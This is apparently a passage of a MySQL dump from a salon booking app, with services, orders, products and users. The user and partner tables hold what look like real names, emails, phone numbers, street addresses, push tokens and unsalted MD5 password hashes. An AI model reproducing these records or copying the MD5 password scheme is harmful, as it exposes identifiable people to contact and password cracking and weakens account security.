(303, '', '', 'Janssen De- Tan', 0, 0, 1, 500, 1, 0, 32, 42, 10, 'Products which inhibit tyrosinase (tanning of the skin via the melanocytes) perform well and the innovative active ingredients have proven'),
(304, '', '', 'O3+ POWER BRIGHTENING FACIAL', 0, 0, 1, 2000, 1, 0, 20, 24, 10, 'Controls and prevents uneven skin tone and pigmentation, brightening and energizing the skin, reduces the appearance of fine lines and wrinkles.'),
(305, '', '', 'Normal Hair Cut', 0, 0, 1, 499, 1, 0, 36, 27, 14, 'A regular haircut, in Western fashion, is a men\\s and boys\\ hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(306, '', '', 'Hair Cut- Fringes ', 0, 0, 1, 250, 1, 0, 36, 27, 14, 'A regular haircut, in Western fashion, is a men\\s and boys\\ hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(307, '', '', 'Touchup- Schwarzkopf Absolute Brown', 0, 0, 1, 899, 1, 0, 36, 28, 14, 'Quick fix to cover the roots of grey hair.'),
(308, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Short Length', 0, 0, 1, 3000, 1, 0, 36, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(309, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Mid Length', 0, 0, 1, 3250, 1, 0, 36, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(310, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Long Length', 0, 0, 1, 3500, 1, 0, 36, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(311, '', '', 'Highlights- Schwarzkorpf', 0, 0, 1, 3500, 1, 0, 36, 28, 14, 'PER STREAK RS. 400 '),
(312, '', '', 'Balayage/ Ombre', 0, 0, 1, 3500, 1, 0, 36, 28, 14, 'A colouring technique where hair colour is painted onto the hair to create a graduated, more natural-looking highlight looking and create a shadow.'),
(313, '', '', 'Schwarzkopf - Shoulder', 0, 0, 1, 949, 1, 0, 36, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(314, '', '', 'Schwarzkopf -  Mid Back Lenght', 0, 0, 1, 999, 1, 0, 36, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(315, '', '', 'Schwarzkopf - Full ', 0, 0, 1, 1199, 1, 0, 36, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(316, '', '', 'Keratin- Upto Neck', 0, 0, 1, 3299, 1, 0, 36, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(317, '', '', 'Keratin- Upto Shoulder', 0, 0, 1, 3599, 1, 0, 36, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(318, '', '', 'Keratin-  Long', 0, 0, 1, 3990, 1, 0, 36, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(319, '', '', 'Glatt- Shoulder', 0, 0, 1, 4750, 1, 0, 36, 31, 14, 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.'),
(320, '', '', 'Glatt- Long', 0, 0, 1, 5500, 1, 0, 36, 31, 14, 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.'),
(321, '', '', 'Ironing', 0, 0, 1, 500, 1, 0, 36, 33, 14, ' Its ability to distribute heat equally.'),
(322, '', '', 'Hair Curling', 0, 0, 1, 500, 1, 0, 36, 33, 14, 'Identifying your curl shape and pattern (or patterns) is best determined while your hair is sopping wet'),
(323, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 33, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(324, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 33, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(325, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 33, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(326, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 33, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_partner_vaccination_certificate`
--

CREATE TABLE `tbl_partner_vaccination_certificate` (
  `id` int(11) NOT NULL,
  `pid` bigint(20) NOT NULL,
  `vac_one` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `vac_two` text COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_partner_vaccination_certificate`
--

INSERT INTO `tbl_partner_vaccination_certificate` (`id`, `pid`, `vac_one`, `vac_two`) VALUES
(3, 2, 'assets/certificate/1636319470Arijit 1st dose.png', 'assets/certificate/1636319571Arijit 1st dose.png'),
(4, 5, 'assets/certificate/1636569429image_picker6018019658645366765.jpg', '');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_payment_list`
--

CREATE TABLE `tbl_payment_list` (
  `id` int(11) NOT NULL,
  `title` text CHARACTER SET utf8 NOT NULL,
  `img` text NOT NULL,
  `attributes` text NOT NULL,
  `status` int(11) NOT NULL DEFAULT 1,
  `subtitle` text DEFAULT NULL,
  `p_show` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_payment_list`
--

INSERT INTO `tbl_payment_list` (`id`, `title`, `img`, `attributes`, `status`, `subtitle`, `p_show`) VALUES
(1, 'Razorpay', 'assets/payment_method/razorpay.png', 'Razorpay_key_here', 1, 'Card, UPI, Net banking, Wallet(Phone Pe, Amazon Pay, Freecharge)', 1),
(2, 'Cash On Delivery', 'assets/payment_method/cash-on-delivery.png', '-', 1, 'Pay via Cash at the time of delivery, It\'s free and only takes a few minutes', 1),
(3, 'Wallet', 'assets/payment_method/wallet.png', '-', 1, 'Wallet used For Place Order!!', 1);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_product`
--

CREATE TABLE `tbl_product` (
  `id` int(11) NOT NULL,
  `bid` int(11) NOT NULL,
  `name` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `img` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` double NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_product`
--

INSERT INTO `tbl_product` (`id`, `bid`, `name`, `img`, `status`) VALUES
(1, 1, 'LOreal Professionnel Serie Expert Liss Unlimited Shampoo', 'http://admin.dudeanddamsels.com/assets/images/img/1636596866mainlissshampoo.jpg', 1),
(2, 1, 'LOreal Professionnel Serie Expert Liss Unlimited Masque', 'http://admin.dudeanddamsels.com/assets/images/img/1636596931main.jpg', 1),
(3, 2, 'Lakme 9To5 Primer + Matte Perfect Cover Foundation', 'http://admin.dudeanddamsels.com/assets/images/img/16365971369To5.jpg', 1),
(4, 2, 'Lakme Peach Milk Soft Crème Moisturizer for Face', 'http://admin.dudeanddamsels.com/assets/images/img/1636597243peach_milk.jpg', 1),
(5, 5, ' Maybelline New York Fit Me 12Hr Oil Control Compact', 'http://admin.dudeanddamsels.com/assets/images/img/1636597665oil_control_compact.jpg', 0),
(7, 5, 'Maybelline New York Fit Me Matte Poreless Powder, 310 Sun Beige', 'http://admin.dudeanddamsels.com/assets/images/img/1636598102sun_beige.jpg', 1);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_prtner_address`
--

CREATE TABLE `tbl_prtner_address` (
  `id` int(11) NOT NULL,
  `pid` int(11) DEFAULT NULL,
  `house_no` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `street_name` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `city` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `pincode` varchar(225) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `isPrimary` tinyint(1) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_prtner_address`
--

INSERT INTO `tbl_prtner_address` (`id`, `pid`, `house_no`, `street_name`, `location`, `city`, `pincode`, `status`, `isPrimary`) VALUES
(1, 2, '41', 'Nilratn Mukherjee Road', 'Shibpur', 'Howrah', '711102', 1, 0),
(6, 2, '45/1', 'Nilratan Mukherjee Road', 'Shibpur', 'Howrah', '711102', 1, 1),
(7, 4, '14', 'Tantipara Lane', 'Mandirtala', 'Howrah', '711102', 1, 1),
(8, 25, '120/b/h/1', 'Ananda palit road', 'Ananda palit road Kolkata700014', 'Kolkata', '700014', 1, 1),
(9, 36, '12C', 'Paymental Garden lane, Tangra', 'China Town', 'Kolkata', '700015', 1, 1);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_sanitization`
--

CREATE TABLE `tbl_sanitization` (
  `id` int(11) NOT NULL,
  `title` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `img` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `video` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_sanitization`
--

INSERT INTO `tbl_sanitization` (`id`, `title`, `img`, `video`, `status`) VALUES
(3, 'WHO Safety Guidelines Followed ', 'http://admin.dudeanddamsels.com/assets/images/img/1638344557hds.jpg', 'http://admin.dudeanddamsels.com/assets/images/video/1638286894Untitled.mp4', 1),
(4, 'Daily Temperature Monitoring', 'http://admin.dudeanddamsels.com/assets/images/img/1638330867images.png', NULL, 1),
(6, 'Single Use Products', 'http://admin.dudeanddamsels.com/assets/images/img/1638331916ezgif_com-gif-maker.jpg', NULL, 1),
(8, 'Tools & Equipments Disinfected', 'http://admin.dudeanddamsels.com/assets/images/img/1638332179barber-disinfecting-tools.jpg', NULL, 1);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_sub_order`
--

CREATE TABLE `tbl_sub_order` (
  `id` bigint(20) NOT NULL,
  `oid` bigint(20) NOT NULL,
  `uid` bigint(20) NOT NULL,
  `service` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` enum('Pending','Cancelled','Confirmed','Completed') COLLATE utf8mb4_unicode_ci DEFAULT 'Pending',
  `count` bigint(20) DEFAULT NULL,
  `total` double DEFAULT NULL,
  `gst` double DEFAULT NULL,
  `subtotal` double DEFAULT NULL,
  `p_amt` double DEFAULT NULL,
  `c_amt` double DEFAULT NULL,
  `pid` bigint(20) DEFAULT NULL,
  `transaction_id` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `rating` double NOT NULL DEFAULT 0,
  `datetime` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_sub_order`
--

INSERT INTO `tbl_sub_order` (`id`, `oid`, `uid`, `service`, `status`, `count`, `total`, `gst`, `subtotal`, `p_amt`, `c_amt`, `pid`, `transaction_id`, `rating`, `datetime`) VALUES
(1, 4, 23, 'Schwarzkopf - Shoulder', 'Pending', 1, 949, 189.8, 949, 759.2, 189.8, NULL, NULL, 0, '2021-12-26 22:08:01'),
(2, 6, 23, 'Schwarzkopf - Shoulder', 'Confirmed', 1, 949, 189.8, 949, 759.2, 189.8, 2, NULL, 0, '2021-12-26 22:42:34'),
(3, 6, 23, 'Schwarzkopf - Full ', 'Confirmed', 1, 1199, 239.8, 1199, 959.2, 239.8, 2, NULL, 0, '2021-12-26 22:42:34'),
(4, 7, 23, 'Schwarzkopf - Shoulder', 'Confirmed', 1, 949, 189.8, 949, 759.2, 189.8, 2, NULL, 0, '2021-12-26 23:24:27'),
(5, 7, 23, 'Schwarzkopf - Full ', 'Confirmed', 1, 1199, 239.8, 1199, 959.2, 239.8, 2, NULL, 0, '2021-12-26 23:24:27'),
(6, 8, 23, 'Schwarzkopf - Shoulder', 'Pending', 1, 949, 189.8, 949, 759.2, 189.8, NULL, NULL, 0, '2021-12-27 06:53:13'),
(7, 8, 23, 'Schwarzkopf - Full ', 'Pending', 1, 1199, 239.8, 1199, 959.2, 239.8, NULL, NULL, 0, '2021-12-27 06:53:13'),
(8, 10, 23, 'Schwarzkopf - Shoulder', 'Confirmed', 1, 949, 189.8, 949, 759.2, 189.8, 2, NULL, 0, '2021-12-27 07:01:56'),
(9, 10, 23, 'Schwarzkopf - Full ', 'Confirmed', 1, 1199, 239.8, 1199, 959.2, 239.8, 2, NULL, 0, '2021-12-27 07:01:56'),
(10, 16, 23, 'Schwarzkopf - Shoulder', 'Pending', 1, 949, 189.8, 949, 759.2, 189.8, NULL, NULL, 0, '2021-12-27 18:24:13'),
(11, 16, 23, 'Schwarzkopf - Full ', 'Pending', 1, 1199, 239.8, 1199, 959.2, 239.8, NULL, NULL, 0, '2021-12-27 18:24:13'),
(12, 17, 25, 'Normal Hair Cut', 'Pending', 2, 998, 199.6, 998, 798.4, 199.6, NULL, NULL, 0, '2022-01-06 11:50:18'),
(13, 18, 25, 'Normal Hair Cut', 'Pending', 2, 998, 199.6, 998, 798.4, 199.6, NULL, NULL, 0, '2022-01-06 11:54:17'),
(14, 19, 26, 'Global ( Schwarzkopf, Absolute Brown)- Short Length', 'Pending', 1, 3000, 600, 3000, 2400, 600, NULL, NULL, 0, '2022-01-06 12:00:55'),
(15, 20, 25, 'Normal Hair Cut', 'Confirmed', 3, 1497, 299.4, 1497, 1197.6, 299.4, 21, NULL, 0, '2022-01-06 12:28:46'),
(16, 21, 25, 'Normal Hair Cut', 'Confirmed', 3, 1497, 299.4, 1497, 1197.6, 299.4, 21, NULL, 0, '2022-01-06 12:30:11'),
(17, 22, 25, 'Full Body - Rica / Roll On', 'Confirmed', 1, 1600, 320, 1600, 1280, 320, 19, NULL, 0, '2022-01-06 12:42:43'),
(18, 23, 25, 'Full Body - Rica / Roll On', 'Confirmed', 1, 1600, 320, 1600, 1280, 320, 26, NULL, 0, '2022-01-06 12:43:13'),
(19, 24, 25, 'Normal Hair Cut', 'Completed', 3, 1497, 299.4, 1497, 1197.6, 299.4, 36, NULL, 0, '2022-01-07 07:39:43');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_testimonial`
--

CREATE TABLE `tbl_testimonial` (
  `id` int(11) NOT NULL,
  `title` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `img` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `video` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_testimonial`
--

INSERT INTO `tbl_testimonial` (`id`, `title`, `img`, `video`, `status`) VALUES
(3, 'Testimonial', 'http://admin.dudeanddamsels.com/assets/images/img/1638611558testimonial.jpg', 'http://admin.dudeanddamsels.com/assets/images/video/1640496008testimonial.mp4', 1);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_user`
--

CREATE TABLE `tbl_user` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `email` text NOT NULL,
  `mobile` double NOT NULL,
  `password` text NOT NULL,
  `uimg` text DEFAULT NULL,
  `ccode` text NOT NULL,
  `status` int(11) NOT NULL DEFAULT 1,
  `code` int(11) NOT NULL,
  `refercode` int(11) DEFAULT NULL,
  `rdate` datetime NOT NULL,
  `wallet` double NOT NULL DEFAULT 0,
  `a_token` text DEFAULT NULL,
  `i_token` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_user`
--

INSERT INTO `tbl_user` (`id`, `name`, `email`, `mobile`, `password`, `uimg`, `ccode`, `status`, `code`, `refercode`, `rdate`, `wallet`, `a_token`, `i_token`) VALUES
(13, 'Faruk', 'suvayan.s30@gmail.com', 9876543212, '9d920f7a817be2e2352045de4413449a', NULL, '+91', 1, 903862, 886947, '2021-10-19 10:01:39', 2500, '', ''),
(14, 'Farid Rahman', 'farid.meher@gmail.com', 8017010592, 'e10adc3949ba59abbe56e057f20f883e', 'assets/user/1639141797scaled_image_picker2718984771114812154.jpg', '+91', 1, 903862, 368250, '2021-10-19 18:57:41', 8950, 'e3SJaK23Mkc7q1PpfFf9xp:APA91bEQBQTZKGTRxxK3Uo5iKW6mLql-KEt6Rloq9jlS2rA2PiS_xH-PEg_862j4Es4jBWhNM5vvd55d43aRM6f_-5syLwB0lEs1GiWs7RHyfIHdg_xqLJl8fTewcHz399VmugceZClX', 'e3SJaK23Mkc7q1PpfFf9xp:APA91bEQBQTZKGTRxxK3Uo5iKW6mLql-KEt6Rloq9jlS2rA2PiS_xH-PEg_862j4Es4jBWhNM5vvd55d43aRM6f_-5syLwB0lEs1GiWs7RHyfIHdg_xqLJl8fTewcHz399VmugceZClX'),
(17, 'Nur', 'abcd@gmail.com', 9876543213, 'e10adc3949ba59abbe56e057f20f883e', 'assets/user/1638461053scaled_1859ec52-b875-46e6-9333-1e178c924c40100830574.jpg', '+91', 1, 903862, 430110, '2021-10-23 13:18:11', 0, 'cfpfza5pSDm71lJf0Z1HTt:APA91bEo57K592xzoyssdrQDqL6S5PKiw5_CIM9tVQInq8K75jYQKVbQkFl0kBgx5lnAhQTnVGPlF5sioRASOsy3PdN0o4wj874VWw4lgILl2TWMakglTFB27sj_DGHHsloCS7mfhdcZ', ''),
(19, 'MD MOSTOFA RAHMAN', 'mostofa.rahman65@gmail.com', 9734103591, '7cf19a02687f106956ed45a0cee98024', 'assets/user/1639459154scaled_image_picker1959467012993381675.jpg', '+91', 1, 903862, 712866, '2021-11-11 04:51:00', 0, 'cGspM9jtQS-9LigQ6j3ACL:APA91bGGTskJhR1ztWdxN6LN_UBMSuJvwjm0aN1z-8FuShcS0brzcg4szG14SHRlRs-IwdROzeag9fYjZxdHfydAQ9uUcxnZMGZ-a9gUkeUpaaogkkYuDK-BI04RJZlp-OXWi1L5cdLp', 'cGspM9jtQS-9LigQ6j3ACL:APA91bGGTskJhR1ztWdxN6LN_UBMSuJvwjm0aN1z-8FuShcS0brzcg4szG14SHRlRs-IwdROzeag9fYjZxdHfydAQ9uUcxnZMGZ-a9gUkeUpaaogkkYuDK-BI04RJZlp-OXWi1L5cdLp'),
(20, 'Haris', 'arijit11@gmail.com', 9876543215, 'e10adc3949ba59abbe56e057f20f883e', NULL, '+91', 1, 903862, 701868, '2021-11-11 06:54:08', 0, NULL, NULL),
(21, 'Prerane Dutta', 'test@gmail.com', 8017010595, 'e10adc3949ba59abbe56e057f20f883e', NULL, '+91', 1, 903862, 558859, '2021-11-11 10:09:43', 0, NULL, NULL),
(22, '', '', 9062029943, '', NULL, '+91', 1, 0, 321472, '2021-11-23 17:37:17', 0, 'cebJQC8LQtCQIFmfOAIBSx:APA91bFAMaJJmCHv6oKji_V75_ZZqqOTLBA8AIU7enqAmQAjClKpnhPrL4lDszEkJn1F462cB1KePJ7cjbpi9hBSwtyWMy9NLXiXdksy3exONK72pRMxT14yzA7KOnvZVBSlI8txuw-s', ''),
(23, 'Arijit Das', 'arijit.das76@gmail.com', 9330292981, 'dbf47fdd341651debbb39d7ca57af7be', 'assets/user/1638522764scaled_image_picker4621017355939542265.jpg', '+91', 1, 903862, 916271, '2021-11-23 18:55:18', 7756, 'ee6liKTETqGKGXmFUZ_VMa:APA91bENdpHpA43jkE_OXFIoHeROzrlthxsMUuTVKy3_zCZcN_R3ACOhTGnmxHoeegT2Uxh7G1fWTiQVznOvJ00rIpiZhPHLfDhzJHESZEVEnp-0yn6zNZLfrU0sIP-6USHR_HoAvFb9', 'ee6liKTETqGKGXmFUZ_VMa:APA91bENdpHpA43jkE_OXFIoHeROzrlthxsMUuTVKy3_zCZcN_R3ACOhTGnmxHoeegT2Uxh7G1fWTiQVznOvJ00rIpiZhPHLfDhzJHESZEVEnp-0yn6zNZLfrU0sIP-6USHR_HoAvFb9'),
(25, 'Ram Das', 'ramdastianshi@gmail.com', 7278511412, '0f24c3c46bc6db13e0e7f0706c7f2b0f', NULL, '+91', 1, 903862, 770160, '2021-11-28 14:13:51', 0, 'ckGyQ_BgTyW0ssrCCCp_2R:APA91bEFnB2j8SwTictQxWY6Ra8_49ir_eFlWlnCVaGy4BZ52SXPHaY-t8Ffq-gefT0hWf9H1y0-L7v6Rcr9pKW9mLxm1g_qX3FVQz1ymhKuslWJpL3nl3fFplvwsGX1naPQxghyndKj', 'ckGyQ_BgTyW0ssrCCCp_2R:APA91bEFnB2j8SwTictQxWY6Ra8_49ir_eFlWlnCVaGy4BZ52SXPHaY-t8Ffq-gefT0hWf9H1y0-L7v6Rcr9pKW9mLxm1g_qX3FVQz1ymhKuslWJpL3nl3fFplvwsGX1naPQxghyndKj'),
(26, 'Sulagna Dutta', 'sulagna.dutta@yahoo.com', 9830067892, '467a20a80815a59e97f7987c596457ca', NULL, '+91', 1, 903862, 582581, '2021-11-28 14:23:14', 0, 'ez5zhai7tkJeqZlTczUyu0:APA91bEKIRp7ho0gtBbPb2Om6pZ_J0Eb8EtE6uToMQCyYNU813SsxFslHo2g_5o9tzPX1sZYOGK_apW8j6eyDlIKcUGVGSjJKeRm3vS6GLQQ3kaLxnHBj2LskyQOJPsOk3uAvc7AING3', 'ez5zhai7tkJeqZlTczUyu0:APA91bEKIRp7ho0gtBbPb2Om6pZ_J0Eb8EtE6uToMQCyYNU813SsxFslHo2g_5o9tzPX1sZYOGK_apW8j6eyDlIKcUGVGSjJKeRm3vS6GLQQ3kaLxnHBj2LskyQOJPsOk3uAvc7AING3'),
(27, 'Bulbul Dutta', 'bulbuldutta42@gmail.com', 9836172020, '467a20a80815a59e97f7987c596457ca', NULL, '+91', 1, 903862, 898908, '2021-11-28 15:17:06', 0, 'f9NYSSaITouOFNdAzy4K8b:APA91bFhbKXEPMGnvN-vfdZsvwh9DwtA45zGTf9smQYvZkaG31h5yHnmoPR5SGi0sfAHIZidBkOXwtuay0OiPiTuKklaPIhNzmwyrVDClHp_pB9t042wwsT5gNdjdYFiW3o5HFIJ18Cn', ''),
(28, 'arijit das', 'arijitdas15@yahoo.com', 8583022812, '2f416abd2e83245e442ccea8d667ffff', NULL, '+91', 1, 903862, 257296, '2021-12-06 05:25:53', 1000, 'flQ0psK2QaWzaF_AZ3oIqI:APA91bHngpfZr8hXGOdt-M46q1X6-fGxUfN3oVsCaSjVA1-QEmWgrKwDngStMARYgu_3PvfYZElZTaEXjs9bd5NW33sQy1G_LR8ac7yCOyjlR5-UaQM1QxZWbpBtj_UoKTXs8j5QwdP_', 'flQ0psK2QaWzaF_AZ3oIqI:APA91bHngpfZr8hXGOdt-M46q1X6-fGxUfN3oVsCaSjVA1-QEmWgrKwDngStMARYgu_3PvfYZElZTaEXjs9bd5NW33sQy1G_LR8ac7yCOyjlR5-UaQM1QxZWbpBtj_UoKTXs8j5QwdP_'),
(29, '', '', 7439676440, '', NULL, '+91', 1, 0, 623665, '2021-12-07 14:27:19', 0, 'dqoKgiMHQLi2DK7ccccjxa:APA91bEr2CZ7KDTFZnAsENYqa_FC2JqetZ9CKt2j8gQ89ViRLXziyY5ly773ArixG21x7rZBgzFjR7dSChtkgVZn3yhm70KJ0IgSY7skwp0H7lLLqSjnPRamjZHxFNuRBW2wRhKdBMPr', ''),
(31, '', '', 9398189672, '', NULL, '+91', 1, 0, 884390, '2021-12-12 06:13:07', 0, NULL, NULL),
(32, 'payal', 'sentipayal@gmail.com', 8879339029, 'ba2a578baaf19a387e8e6d868415229e', NULL, '+91', 1, 903862, 388845, '2021-12-13 06:12:19', 0, 'fukWujKRTEuq6IsvGgsppD:APA91bH_JQOvIN_yjqmWruFexej1HZ2ewsq4uBHFAIgWojFPiP9MO5vOEXgk1Bl7E_qZfyqNkfnyiBvFVQ4A1vuqZPAmkbFdguwvw8NpiAshFsaq6fqQFkYS_VIRJSiLyD5hsMtCDb99', 'fukWujKRTEuq6IsvGgsppD:APA91bH_JQOvIN_yjqmWruFexej1HZ2ewsq4uBHFAIgWojFPiP9MO5vOEXgk1Bl7E_qZfyqNkfnyiBvFVQ4A1vuqZPAmkbFdguwvw8NpiAshFsaq6fqQFkYS_VIRJSiLyD5hsMtCDb99'),
(33, 'Soni Ali', 'soniali562ashu@gmail.com', 9123337076, '', NULL, '+91', 1, 0, 287461, '2021-12-13 08:50:00', 0, 'e5phphCjSwWJRE7JrhtEwY:APA91bEx19R09GcuPA5dcsfdV5CPHyUhH1WR71GICaNoGsASddec68IX_OS5GxqsQi4HmxMvcKeMaCWRdDFA_ZyxfV6uPF_K9o7t5JHTAuGhWSlHfke5XCUAwnyWZx5owqK1NS3B29d_', 'e5phphCjSwWJRE7JrhtEwY:APA91bEx19R09GcuPA5dcsfdV5CPHyUhH1WR71GICaNoGsASddec68IX_OS5GxqsQi4HmxMvcKeMaCWRdDFA_ZyxfV6uPF_K9o7t5JHTAuGhWSlHfke5XCUAwnyWZx5owqK1NS3B29d_'),
(34, '', '', 8100500815, '', NULL, '+91', 1, 0, 458335, '2021-12-13 13:24:42', 0, 'c0KPxFqES6GrliJWxnb3VK:APA91bG5N1eJTIBaBDzCvNrnDcXbadnRCovgdJ07vmQsYiukKZ8JGhfEP82UV8k3_RILLgw9hhomLrMp7t9I2fGOJqeP-WGyMTxN1_qSDxtp1vIwpdRBNWCXML4PNVAGWjY8OYQ-QteQ', 'c0KPxFqES6GrliJWxnb3VK:APA91bG5N1eJTIBaBDzCvNrnDcXbadnRCovgdJ07vmQsYiukKZ8JGhfEP82UV8k3_RILLgw9hhomLrMp7t9I2fGOJqeP-WGyMTxN1_qSDxtp1vIwpdRBNWCXML4PNVAGWjY8OYQ-QteQ'),
(36, '', '', 9903646695, '', NULL, '+91', 1, 0, 183469, '2021-12-17 07:31:20', 0, 'eE1gEnZBQdu0SO7OQG46tw:APA91bGml8CxnDM7i9CoHQrkGqzdpxo4LEEJUdMLdMzRNqRVzVnrlG7JidPLNCAgZ6XRabGxxKx3lvYWbaOD15tr-_0IGL3BsM15rInJXnT7IiIThpll7dSEoeAYB9lxUkhV_5Q399j9', 'eE1gEnZBQdu0SO7OQG46tw:APA91bGml8CxnDM7i9CoHQrkGqzdpxo4LEEJUdMLdMzRNqRVzVnrlG7JidPLNCAgZ6XRabGxxKx3lvYWbaOD15tr-_0IGL3BsM15rInJXnT7IiIThpll7dSEoeAYB9lxUkhV_5Q399j9'),
(37, '', '', 9830714618, '', NULL, '+91', 1, 0, 765304, '2021-12-17 16:26:07', 0, 'cidRHk8fTcyfLQ4Nl5e5Ax:APA91bHjAqG56u7V7ZllXuE4P_MDFMC3-Ko-R6KSfy3l-PduEWpztWdZbdbnDjejbb0yp4u087arWeE84Yw_o4F7SnqVdWx0Rot2TM7r3uYJHlRFkFNBV0_4ZeNAvrwtqTLn1NWmMVy1', 'cidRHk8fTcyfLQ4Nl5e5Ax:APA91bHjAqG56u7V7ZllXuE4P_MDFMC3-Ko-R6KSfy3l-PduEWpztWdZbdbnDjejbb0yp4u087arWeE84Yw_o4F7SnqVdWx0Rot2TM7r3uYJHlRFkFNBV0_4ZeNAvrwtqTLn1NWmMVy1'),
(38, '', '', 8420429744, '', NULL, '+91', 1, 0, 449327, '2021-12-18 10:47:52', 0, 'cxuOJ-HdREqmUms60_Jyu6:APA91bGNqr3q-cnhdpK7_yP30Jjb-8WH4aXj3RqWCnBenLc3O-sfRuUzDDXoWHwUtULVb0ZtvEZcYReDZ9UBBRN0qTQ4ri8n-yVhdS10jVnVebgJrAHIdLG2ddaWiHBx5VjibRxxwYTS', 'cxuOJ-HdREqmUms60_Jyu6:APA91bGNqr3q-cnhdpK7_yP30Jjb-8WH4aXj3RqWCnBenLc3O-sfRuUzDDXoWHwUtULVb0ZtvEZcYReDZ9UBBRN0qTQ4ri8n-yVhdS10jVnVebgJrAHIdLG2ddaWiHBx5VjibRxxwYTS'),
(39, '', '', 9748354518, '', NULL, '+91', 1, 0, 842461, '2021-12-18 11:36:21', 0, 'd2eOYKOXTwGg5n051RlRy9:APA91bGus-BHft1ayJCe2FEsGm5yO-266uYwU8fNO-n3JMHc524kyQZ5_s6Eb61keoMCCordXmts7-fWFKmbibCJeDz_mC9vvn02YRmpPZJtAJyl934v319VAnwYPNUm9zJYmff3j8OV', 'd2eOYKOXTwGg5n051RlRy9:APA91bGus-BHft1ayJCe2FEsGm5yO-266uYwU8fNO-n3JMHc524kyQZ5_s6Eb61keoMCCordXmts7-fWFKmbibCJeDz_mC9vvn02YRmpPZJtAJyl934v319VAnwYPNUm9zJYmff3j8OV'),
